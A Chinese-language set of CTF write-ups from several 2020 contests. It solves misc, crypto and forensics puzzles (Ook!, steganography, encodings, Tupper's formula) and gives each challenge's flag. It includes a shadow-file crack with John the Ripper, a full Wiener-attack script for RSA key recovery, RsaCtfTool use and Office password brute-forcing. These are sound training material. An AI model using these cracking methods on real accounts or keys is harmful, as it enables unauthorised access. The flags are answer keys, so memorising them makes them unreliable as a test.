Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!
Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!
Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook.
Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!
Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook?
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook.
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.
Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?
Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?
Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?
Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook.
Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook. Ook? Ook. 
```

```python
#!/usr/bin/env python
#
# an Ook! interpreter written in python
#
# you can wrap the memory pointer to the end of the the memory cells
# but you cannot do the same trick to get the first cell, since going
# further out would just initiate a new memory cell.
#
#
# 2003-02-06: Thanks to John Farrell for spotting a bug!

import sys, string, types

def massage(text):
    ret = []
    tok = []

    for line in text:
        if line[0] != ";" and line != "\n" and line != "":
            for token in line.split(" "):
                if token != "":
                    ret.append(token.strip())
    return ret

def sane(code):
    if len(code) % 2 == 0:
        return 1
    else:
        return 0

class OokInterpreter:

    memory = [0]
    memptr = 0
    file   = None
    code   = None
    len    = 0
    codei  = 0

    def __langinit(self):
        self.lang   = {'Ook. Ook?' : self.mvptrup,
                       'Ook? Ook.' : self.mvptrdn,
                       'Ook. Ook.' : self.incptr,
                       'Ook! Ook!' : self.decptr,
                       'Ook. Ook!' : self.readc,
                       'Ook! Ook.' : self.prntc,
                       'Ook! Ook?' : self.startp,
                       'Ook? Ook!' : self.endp}

    def mem(self):
        return self.memory[self.memptr]

    def __init__(self, file):
        self.__langinit()
        self.file = open(file)
        self.code = massage(self.file.readlines())
        self.file.close()
        if not sane(self.code):
            print self.code
            raise "OokSyntaxError", "Code not sane."
        else:
            self.cmds()

    def run(self):
        self.codei = 0
        self.len  = len(self.code)
        while self.codei < self.len:
            self.lang[self.code[self.codei]]()
            self.codei += 1

    def cmds(self):
        i = 0
        l = len(self.code)
        new = []
        while i < l:
            new.append(string.join((self.code[i], self.code[i+1]), " "))
            i += 2
        self.code = new

    def startp(self):
        ook = 0
        i   = self.codei
        if self.memory[self.memptr] != 0:
            return None
        while 1:
            i += 1
            if self.code[i] == 'Ook! Ook?':
                ook += 1
            if self.code[i] == 'Ook? Ook!':
                if ook == 0:
                    self.codei = i
                    break
                else:
                    ook -= 1
            if i >= self.len:
                raise 'OokSyntaxError', 'Unmatched "Ook! Ook?".'

    def endp(self):
        ook = 0
        i   = self.codei
        if self.memory[self.memptr] == 0:
            return None
        if i == 0:
            raise 'OokSyntaxError', 'Unmatched "Ook? Ook!".'
        while 1:
            i -= 1
            if self.code[i] == 'Ook? Ook!':
                ook += 1
            if self.code[i] == 'Ook! Ook?':
                if ook == 0:
                    self.codei = i
                    break
                else:
                    ook -= 1
            if i <= 0:
                raise 'OokSyntaxError', 'Unmatched "Ook? Ook!".'

    def incptr(self):
        self.memory[self.memptr] += 1

    def decptr(self):
        self.memory[self.memptr] -= 1

    def mvptrup(self):
        self.memptr += 1
        if len(self.memory) <= self.memptr:
            self.memory.append(0)

    def mvptrdn(self):
        if self.memptr == 0:
            self.memptr = len(self.memory) - 1
        else:
            self.memptr -= 1

    def readc(self):
        self.memory[self.memptr] = ord(sys.stdin.read(1))

    def prntc(self):
        sys.stdout.write(chr(self.mem()))


if __name__ == '__main__':
    o = OokInterpreter(sys.argv[1])
    o.run()
```

```
flag{9_zhe_Jiu_zhe_8_hui_8}
```

###### 你能破解我的密码吗

给了个shadow文件，直接用john得到密码

```
john shadow
john --show shadow
```

```
guguguguji:123456:18556:0:99999:7:::
```

###### 被删除的flag

file查看是ext3文件

```
file flag 

flag: Linux rev 1.0 ext3 filesystem data, UUID=635744a6-d4dc-4e10-a946-da071b3150c5 (large files)
```

题目提示被删除，用extundelete恢复：

```
extundelete --inode 2 flag
```

![image-20201130104103761](/image-20201130104103761.png)

flag.txt的编号是12。

```
extundelete --restore-inode 12 flag
```

###### 零

```
‌‌‌‌‍﻿‍‍Neyxj dycs‌‌‌‌‍‬﻿‬ oush,ciuyh‌‌‌‌‍‬‌﻿ guheks bzudh ‌‌‌‌‍﻿‍‌msaksdh iygsch lasudl.Xucjd zuxjcy‌‌‌‌‍‬‍‬‌‌‌‌‍﻿‬﻿ ishch is‌‌‌‌‍﻿‌﻿ vusj.I‌‌‌‌‍﻿‬‍ suduy chis the chaie hunsh ‌‌‌‌‍‬‌﻿lin,lisnd ‌‌‌‌‍‬‬‬zsusy oiyub ‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‍‌muuyn are syenh ling.Jsudbh nec ‌‌‌‌‍‍﻿﻿orci no‌‌‌‌‌﻿‍‬ urna‌‌‌‌‍‬‬‌‌‌‌‌‍﻿‍‬ non‌‌‌‌‍‬‍﻿ ultricise,‌‌‌‌‍‬‬‬conseturen ‌‌‌‌‍‍﻿﻿in yeuseqr eund val‌‌‌‌‌﻿‬‌ will ping,churneo‌‌‌‌‍‬‍﻿ sudyens lzuebhs‌‌‌‌‍‬‍‬ poin‌‌‌‌‍‬‬‬ sudhen‌‌‌‌‍﻿﻿‍ .Yshebsn kash as zjehsn quis nunie lings zlinjen zune,shxuea zjhenbh suebn snchben zlings.
```

题目提示0，猜测是Zero-Width Characters

![image-20201130104358199](/image-20201130104358199.png)

###### 躲猫猫

全选，取消隐藏；sheet，取消隐藏。

重复几次该步骤，在sheet2发现一串base64编码。

最后base64解码后得到flag。

###### 网络深处1

```
题目内故事纯属虚构，完全架空。

你是一名学生，你在夜间路过一个电话亭，一个人鬼鬼祟祟的进入电话亭拨通了一个电话又拿出手机录了音，他反常的行为引起了你的注意，他走后你决定去电话亭看看。
电话亭里又一个皱巴巴的纸条，上面写着一串数字：636806841748368750477720528895492611039728818913495104112781919263174040060359776171712496606031373211949881779178924464798852002228370294736546700438210687486178492208471812570216381077341015321904079977773352308159585335376746026882907466893864815887274158732965185737372992697108862362061582646638841733361046086053127284900532658885220569350253383469047741742686730128763680253048883638446528421760929131783980278391556912893405214464624884824555647881352300550360161429758833657243131238478311219915449171358359616665570429230738621272988581871，这很可能是刚才的人不小心丢在这里的，这显然不是电话号码，这使你更加好奇，你决定看看他拨的是什么电话号码。
你按了一下重拨键，想看看他拨打的电话号码，但是这个公用电话的屏幕坏了，之传出了一段拨号音，你迅速挂掉电话又重拨了一次并录下了拨号音。
回到寝室的你像弄清楚字条的含义，看来只有得到他拨打的电话才能搞明白字条的含义了。
得到电话号码以后，你拨通了他，里面传出一段杂音，一筹莫展的你决定将这件奇怪的事情告诉警察。
```

给了一个拨号音.wav，用dtmf2num处理一下得到压缩密码。

解压出来的文件中有一个txt文件，内容如下：

```
你是一名警察，前段时间有一个学生上报了一个可疑事件，一个人鬼鬼祟祟的打了一通电话又录了音，离开时不小心落下一个意义不明的字条。这名学生给了你一段拨号音，拨号音得到的电话号码，以及那个奇怪的字条。你拨通了那段电话并录了音，里面传出一段刺耳的奇怪录音，录音中可能就有关于字条破解方式的提示，你决定找到字条的秘密。
破解了字条以后，得到一个似曾相识的字符串。

# 得到的字符串就是flag，flag格式为flag{}

你认得这字符串，是某种处理过的字符串，解码以后出现了一个熟悉的单词，看来有必要查查这个人了。

# 不能再往下出了，有缘再见吧
```

还有个电话录音.wav，看频谱时发现提示“我是tupper”。

用塔珀自指公式解题目那串数字即可得到flag：

```python
__pypdoc__ = """
Method: Tupper_self_referential_formula
Link: http://www.pypedia.com/index.php/Tupper_self_referential_formula
Retrieve date: Mon, 08 Feb 2016 13:31:06 -0500
Plots the [http://en.wikipedia.org/wiki/Tupper's_self-referential_formula Tupper's_self-referential_formula]:
: <math>{1\over 2} < \left\lfloor \mathrm{mod}\left(\left\lfloor {y \over 17} \right\rfloor 2^{-17 \lfloor x \rfloor - \mathrm{mod}(\lfloor y\rfloor, 17)},2\right)\right\rfloor</math>
The plot is the very same formula that generates the plot.
[[Category:Validated]]
[[Category:Algorithms]]
[[Category:Math]]
[[Category:Inequalities]]
"""
def Tupper_self_referential_formula():
    k = 636806841748368750477720528895492611039728818913495104112781919263174040060359776171712496606031373211949881779178924464798852002228370294736546700438210687486178492208471812570216381077341015321904079977773352308159585335376746026882907466893864815887274158732965185737372992697108862362061582646638841733361046086053127284900532658885220569350253383469047741742686730128763680253048883638446528421760929131783980278391556912893405214464624884824555647881352300550360161429758833657243131238478311219915449171358359616665570429230738621272988581871
    def f(x,y):
        d = ((-17 * x) - (y % 17))
        e = reduce(lambda x,y: x*y, [2 for x in range(-d)]) if d else 1
        f = ((y / 17) / e)
        g = f % 2
        return 0.5 < g
    for y in range(k+16, k-1, -1):
        line = ""
        for x in range(0, 107):
            if f(x,y):
                line += "@"
            else:
                line += " "
        print line
 
##Method name =Tupper_self_referential_formula()
if __name__ == '__main__':
    print __pypdoc__
    returned = Tupper_self_referential_formula()
    if returned:
        print 'Method returned:'
        print str(returned)
```

###### Wing

![image-20201206220139346](/image-20201206220139346.png)

Windings2字体，找个对照表对照变换一下即可得到flag：

![image-20201206220147992](/image-20201206220147992.png)

###### 简单的RSA

```
e= 18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781
n= 147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701
c= 140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934
```

e特别大，使用维纳攻击：

```python
import gmpy2
import time
def continuedFra(x, y):
    cF = []
    while y:
        cF += [x / y]
        x, y = y, x % y
    return cF
def Simplify(ctnf):
    numerator = 0
    denominator = 1
    for x in ctnf[::-1]:
        numerator, denominator = denominator, x * denominator + numerator
    return (numerator, denominator)
def calculateFrac(x, y):
    cF = continuedFra(x, y)
    cF = map(Simplify, (cF[0:i] for i in xrange(1, len(cF))))
    return cF
def solve_pq(a, b, c):
    par = gmpy2.isqrt(b * b - 4 * a * c)
    return (-b + par) / (2 * a), (-b - par) / (2 * a)
def wienerAttack(e, n):
    for (d, k) in calculateFrac(e, n):
        if k == 0: continue
        if (e * d - 1) % k != 0: continue
        phi = (e * d - 1) / k
        p, q = solve_pq(1, n - phi + 1, n)
        if p * q == n:
            return abs(int(p)), abs(int(q))
    print 'not find!'
time.clock()
e= 18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781
n= 147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701
c= 140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934
p, q = wienerAttack(e, n)
print '[+]Found!'
print '  [-]p =',p
print '  [-]q =',q
print '  [-]n =',p*q
d = gmpy2.invert(e,(p-1)*(q-1))
print '  [-]d =', d
print '  [-]m is:' + '{:x}'.format(pow(c,d,n)).decode('hex')
print '\n[!]Timer:', round(time.clock(),2), 's'
print '[!]All Done!'
```

###### EZ_IMAGE

给了一堆图，用gaps自动拼接起来即可得到flag。

```
montage unctf*.jpg -tile 15x15 -geometry 60x60+0+0 test.jpg
gaps --image=test.jpg --generation=30 --population=300 --size=60 --save
```

# HECTF2020

#### crypto

###### no blank space

```
.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.
```

给了一串像是摩斯密码的东西，但是解不了，查到有个博多密码。

尝试用博多密码去解还是解不出来，最后发现是其变种International Telegraph Alphabet No. 2 (ITA2)

最坑的是python的codext库解ITA2有问题，无法处理数字的情况，只能自己写个脚本解：

```
code_data = '''00000	null	null
00100	espace	espace
10111	Q	1
10011	W	2
00001	E	3
01010	R	4
10000	T	5
10101	Y	6
00111	U	7
00110	I	8
11000	O	9
10110	P	0
00011	A	-
00101	S	BELL
01001	D	$
01101	F	!
11010	G	&
10100	H	#
01011	J	'
01111	K	(
10010	L	)
10001	Z	"
11101	X	/
01110	C	:
11110	V	;
11001	B	?
01100	N	,
11100	M	.
01000	Carriage Return CR	Carriage Return CR
00010	Line Feed LF	Line Feed LF
11011	Switch to Digits	'''
code_data = code_data.split('\n')
code_datas = {}
code_datas_num = {}
for i in code_data:
    code_datas[i.split('	')[0]] = i.split('	')[1]
    code_datas_num[i.split('	')[0]] = i.split('	')[2]
    if len(i.split('	')[1]) > 1:
        code_datas[i.split('	')[0]] = ' '
    if len(i.split('	')[2]) > 1:
        code_datas_num[i.split('	')[0]] = ' '
print(code_datas)
print(code_datas_num)

s = '.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.'
s= s.replace('.', '1')
s= s.replace('-', '0')
print(s)
a = ''
num = 0
for i in range(int(len(s)/5)):
    # print(s[i*5:i*5+5])
    if s[i*5:i*5+5] == '11011':
        num = 1
        continue
    if s[i*5:i*5+5] == '11111':
        num = 0
        continue
    if num == 0:
        print(code_datas[s[i*5:i*5+5]], end='')
    else:
        print(code_datas_num[s[i*5:i*5+5]], end='')
```

#### misc

###### Make Steg Great Again

给了一张Steg.jpg，010editor查看二进制发现尾部有个密码P@SsW00000。

steghide得到一个压缩包。

```
steghide extract -sf Steg.jpg -p P@SsW00000
```

解压得到一个pyc文件和一个txt文件，pyc文件可以用stegosaurus获得隐写信息：

```
python3 stegosaurus.py GitHacker.pyc -x

Extracted payload: Your_key_is:'PPPPasword'_And_do_you_love_winter
```

winter？猜测snow隐写，把该密码用snow隐写处理txt文件得到flag：

```
SNOW -C -p PPPPasword white.txt

DASCTF{2741590dbe55ead7f2bfc50abb2d73e3}
```

# Affinity-CTF-Lite2020

#### forensics

###### wholeisbetter

给了一个pdf文件，用PdfStreamDumper检查发现一堆数据：

```
<?xpacket begin='???' id='W5M0MpCehiHzreSzNTczkc9d'?>
<x:xmpmeta xmlns:x='adobe:ns:meta/' x:xmptk='Image::ExifTool 10.80'>
<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>

 <rdf:Description rdf:about=''
  xmlns:dc='http://purl.org/dc/elements/1.1/'>
  <dc:creator>
   <rdf:Seq>
    <rdf:li>Li4tLS0tLi4uLS0tLS0tLi4tLS0tLS0uLi4tLS0tLi4uLS0tLS0tLi4tLS0tLS0uLi4uLS0tLS4uLS0tLS0tLi4tLS4uLS0uLi4tLS0tLi4uLS0tLS0tLi4tLS0tLS0uLi0tLi4uLS0uLi0tLS0tLS4uLS0tLS0tLi4uLS0tLS4uLi0tLS0tLi4uLi0tLS0uLi4tLS0tLS0uLi4tLS0tLi4uLS0tLS4uLgo=#1</rdf:li>
   </rdf:Seq>
  </dc:creator>
  <dc:subject>
   <rdf:Bag>
    <rdf:li>Li0tLS0tLS4uLS0tLS4uLi4tLS0tLi4uLi0tLi4uLi4uLi4tLS4uLi4tLS0tLi4uLi0tLS4uLi4uLi4tLS4uLi4tLS0tLS0uLi0tLS0tLS4uLi4tLS4uLi4tLS0tLi4uLi0tLi0uLS0uLi0tLS0uLi4uLi4tLS4uLi4tLS0tLS0uLi0tLi4tLS4uLS0tLS0tLi4uLi0tLi4uLi0tLS0tLS4uLi4uLS0tLgo=#3</rdf:li>
   </rdf:Bag>
  </dc:subject>
 </rdf:Description>

 <rdf:Description rdf:about=''
  xmlns:pdf='http://ns.adobe.com/pdf/1.3/'>
  <pdf:Author>Li0tLi4tLS4uLS0uLi4uLi4tLS4uLi4uLi0tLi4tLS4uLi4tLS4uLi4tLS4uLi4uLi4uLS0uLi4uLi4tLS4uLi4tLS4uLS0uLi0tLi4tLS4uLi4tLS4uLi4tLS4uLi4uLi0tLi4uLS0uLi0tLi4uLi4uLi4tLS4uLi4tLS4uLS0uLi0tLi4tLS4uLS0uLi0tLi4uLi0tLi4uLi0tLi4tLS4uLi4tLS4uLgo=#4</pdf:Author>
  <pdf:Keywords>Li0tLi4tLS4uLS0uLi4uLi4tLS4uLi4uLi0tLi4tLS4uLi4tLS4uLi4tLS4uLi4uLi4uLS0uLi4uLi4tLS4uLi4tLS4uLS0uLi0tLi4tLS4uLi4tLS4uLi4tLS4uLi4uLi0tLS4tLS0uLi0tLi4uLi4uLi4tLS4uLi4tLS4uLS0uLi0tLi4tLS4uLS0uLi0tLi4uLi0tLi4uLi0tLi4tLS4uLi4tLS4uLgo=#2</pdf:Keywords>
  <pdf:Producer>Li0tLi4tLS4uLS0uLi4uLi4tLS4uLi4uLi4tLS0tLi4uLi4tLS4uLi4tLS4uLi4uLi4uLS0tLS4uLS0tLS0tLi4tLS4uLS0uLi0tLi4tLS4uLi4tLS4uLi4tLS0tLS0uLi0tLi4uLS0uLi0tLS0tLS4uLi4tLS4uLi4tLS4uLS0uLi0tLS0tLi4uLS0uLi0tLi4uLi0tLi4uLi0tLi4tLS4uLS0tLS4uLgo=#5</pdf:Producer>
 </rdf:Description>
</rdf:RDF>
</x:xmpmeta>
```

一共五条，发现能够base64解密，解密后会得到摩斯密码，但是摩斯密码解码出来后没有得到flag。

仔细观察发现每串结尾都有序号，而且base64解密出来的摩斯密码最后有换行符，猜测是需要叠起来看。

最后把模式密码的-替换成0后发现能拼接成flag：

```python
import base64

a1='Li4tLS0tLi4uLS0tLS0tLi4tLS0tLS0uLi4tLS0tLi4uLS0tLS0tLi4tLS0tLS0uLi4uLS0tLS4uLS0tLS0tLi4tLS4uLS0uLi4tLS0tLi4uLS0tLS0tLi4tLS0tLS0uLi0tLi4uLS0uLi0tLS0tLS4uLS0tLS0tLi4uLS0tLS4uLi0tLS0tLi4uLi0tLS0uLi4tLS0tLS0uLi4tLS0tLi4uLS0tLS4uLgo='
a3='Li0tLS0tLS4uLS0tLS4uLi4tLS0tLi4uLi0tLi4uLi4uLi4tLS4uLi4tLS0tLi4uLi0tLS4uLi4uLi4tLS4uLi4tLS0tLS0uLi0tLS0tLS4uLi4tLS4uLi4tLS0tLi4uLi0tLi0uLS0uLi0tLS0uLi4uLi4tLS4uLi4tLS0tLS0uLi0tLi4tLS4uLS0tLS0tLi4uLi0tLi4uLi0tLS0tLS4uLi4uLS0tLgo='
a4='Li0tLi4tLS4uLS0uLi4uLi4tLS4uLi4uLi0tLi4tLS4uLi4tLS4uLi4tLS4uLi4uLi4uLS0uLi4uLi4tLS4uLi4tLS4uLS0uLi0tLi4tLS4uLi4tLS4uLi4tLS4uLi4uLi0tLi4uLS0uLi0tLi4uLi4uLi4tLS4uLi4tLS4uLS0uLi0tLi4tLS4uLS0uLi0tLi4uLi0tLi4uLi0tLi4tLS4uLi4tLS4uLgo='
a2='Li0tLi4tLS4uLS0uLi4uLi4tLS4uLi4uLi0tLi4tLS4uLi4tLS4uLi4tLS4uLi4uLi4uLS0uLi4uLi4tLS4uLi4tLS4uLS0uLi0tLi4tLS4uLi4tLS4uLi4tLS4uLi4uLi0tLS4tLS0uLi0tLi4uLi4uLi4tLS4uLi4tLS4uLS0uLi0tLi4tLS4uLS0uLi0tLi4uLi0tLi4uLi0tLi4tLS4uLi4tLS4uLgo='
a5='Li0tLi4tLS4uLS0uLi4uLi4tLS4uLi4uLi4tLS0tLi4uLi4tLS4uLi4tLS4uLi4uLi4uLS0tLS4uLS0tLS0tLi4tLS4uLS0uLi0tLi4tLS4uLi4tLS4uLi4tLS0tLS0uLi0tLi4uLS0uLi0tLS0tLS4uLi4tLS4uLi4tLS4uLS0uLi0tLS0tLi4uLS0uLi0tLi4uLi0tLi4uLi0tLi4tLS4uLS0tLS4uLgo='
s1=(str(base64.b64decode(a1), encoding='utf-8'))
s2=(str(base64.b64decode(a2), encoding='utf-8'))
s3=(str(base64.b64decode(a3), encoding='utf-8'))
s4=(str(base64.b64decode(a4), encoding='utf-8'))
s5=(str(base64.b64decode(a5), encoding='utf-8'))
s1 = s1.replace('-', '0')
s2 = s2.replace('-', '0')
s3 = s3.replace('-', '0')
s4 = s4.replace('-', '0')
s5 = s5.replace('-', '0')
s1 = s1.replace('\n', '')
s2 = s2.replace('\n', '')
s3 = s3.replace('\n', '')
s4 = s4.replace('\n', '')
s5 = s5.replace('\n', '')
print(s1)
print(s2)
print(s3)
print(s4)
print(s5)
```

###### Aether plane take off

题目提示31，Fldigi解码BPSK-31：

![image-20201211162634629](/image-20201211162634629.png)![image-20201211162646808](/image-20201211162646808.png)

###### BreakMe

给了encrypted.txt和public.pem，用RsaCtfTool即可。

```
python3 RsaCtfTool.py --publickey public.pem --uncipherfile encrypted.txt
```

# 祥云杯2020

#### misc

###### 到点了

第一个word，全选→字体→隐藏，发现隐藏字符串：

```
宝贝，8位字母数字，你懂的
```

用Accent OFFICE Password Recovery爆破第二个word获得密码。

打开后全选改色，发现一串字符串：

```
AABBAABBBAABBBAAAABBABBABABAAAAABBAAABBBBAABBBAABABABBAAABAAAABAABAABBABAAAAABAA
```

培根解密后得到：

```
GOODNIGHTSWEETIE
goodnightsweetie
```

第三个word，改后缀名为rar后解压得到4.zip，解压后得到一个bmp图片。

用wbStego43open得到flag，密码为word2的密码。

###### 带音乐家

file查看没有后缀名的文件，发现是MIDI文件，用Velato处理后得到

```
Hello, World!
```

检查另一个压缩文件，发现该文件注释里有大段空白，短的转为.，长的转为-变为摩斯密码：

```
.- . ... -.- . -.-- ----. ..--- .---- ----. ..--- ...-- ..--- ...-- ..--- ..---

AESKEY9219232322
```

Hello, World!解压该压缩包得到一个word文件，，全选→字体→隐藏，发现隐藏字符串：

```
nvPrjrss1PyqAZB/14lkvJGTJ9l4rOfwJeqSqSHSqXU=
```

aes解密得到flag。

# 纵横杯

###### 签到

```
[0146, 0154, 0141, 0147, 0173, 0167, 063, 0154, 0143, 0157, 0155, 0145, 0137, 0164, 0157, 0137, 062, 0157, 0156, 0147, 0137, 0150, 063, 0156, 0147, 0137, 0142, 0145, 061, 0175]
```

八进制转ascii转字符串：

```python
s='0146, 0154, 0141, 0147, 0173, 0167, 063, 0154, 0143, 0157, 0155, 0145, 0137, 0164, 0157, 0137, 062, 0157, 0156, 0147, 0137, 0150, 063, 0156, 0147, 0137, 0142, 0145, 061, 0175'
for i in s.split(', '):
    print(chr(int(i,8)), end='')
```

# \#kksctf open 2020

###### bson

```
{"task_name":"bson","message_pack_data":"82a36b65795ca4666c6167dc003137372f27362f6c3203352f033f6c6c30033e292803343d2a6f0325332903282e35393803316f2f2f1c3b39032c3d3f3721"}
```

bson加密，可用脚本解密：

```
import msgpack

s = '82a36b65795ca4666c6167dc003137372f27362f6c3203352f033f6c6c30033e292803343d2a6f0325332903282e35393803316f2f2f1c3b39032c3d3f3721'
data = bytes().fromhex(s)
print(msgpack.loads(data))
```

```
